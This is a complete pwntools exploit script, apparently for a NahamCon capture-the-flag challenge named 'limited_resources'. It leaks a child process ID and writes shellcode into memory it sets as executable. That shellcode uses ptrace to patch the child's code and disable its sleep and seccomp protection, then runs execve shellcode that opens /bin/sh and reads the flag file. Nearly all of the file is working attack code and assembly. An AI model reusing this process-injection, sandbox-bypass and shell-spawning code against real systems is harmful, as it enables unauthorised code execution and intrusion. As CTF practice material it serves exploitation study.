#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

# patched binary version with shorter sleep
exe = ELF('./limited_resources')

host, port = "challenge.nahamcon.com", "30617"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

sla(b'Exit\n',b'2')
pid = int(rcu(b'PID = ',b'\n'),10)
logleak('pid',pid)

shellc2 = asm('''
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
  ''')
  
shellc = asm('''
looping:

  mov ebp,%d		/* ebp = pid of child */
// ptrace(PTRACE_ATTACH,child,0,0)
  mov edi,0x10
  mov esi,ebp
  xor edx,edx
  xor r10,r10
  mov eax,101
  syscall

// wait a bit
  mov rcx,0xffffffff
wait:
  nop
  nop
  loop wait

/* patch program to remove jmp after call to sleep() */
/* ptrace(PTRACE_POKEDATA,chid, addr, data */
  mov edi,5
  mov esi,ebp
  mov edx,0x4018df
  mov r10,0xE800402090bf9090
  mov eax,101
  syscall

/* patch program to remove call to protectprogram() */
/* ptrace(PTRACE_POKEDATA,chid, addr, data */
  mov edi,5
  mov esi,ebp
  mov edx,0x401aa9
  mov r10,0x9090909090000000
  mov eax,101
  syscall

// ptrace(PTRACE_DETACH,child,0,0
  mov edi,0x11
  mov esi,ebp
  xor edx,edx
  xor r10,r10
  mov eax,101
  syscall


loopit:
 jmp loopit

format:
  .ascii "result = %%llx"
  .byte 10

''' % pid)

# create a RWX mem zone
sla(b'Exit\n',b'1')
sla(b'be?\n', b'140000')
sla(b'y?\n', b'7')
# pause()
sla(b'de?\n', shellc)
# leak buffer address
buffer = int(rcu('at ', '\n'),16)
logleak('buffer at', buffer)

# pause()
sla(b'Exit\n',b'3')
sla(b'code?\n', hex(buffer))
# pause()
shellc2 = asm('''
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
  ''')

# now the client is in menu loop
# but without call to seccomp before execute

sla(b'Exit\n',b'1')
sla(b'be?\n', b'4096')
sla(b'y?\n', b'7')
print(shellc2)
# pause()

sla(b'de?\n', shellc2)

# send execve shellcode to client
shellc2_addr = int(rcu('at ', '\n'),16)
logleak('shellcode at', shellc2_addr)

# pause()
sla(b'Exit\n',b'3')
sla(b'code?\n', hex(shellc2_addr))

# got flag
p.sendline(b'id;cat flag*')

p.interactive()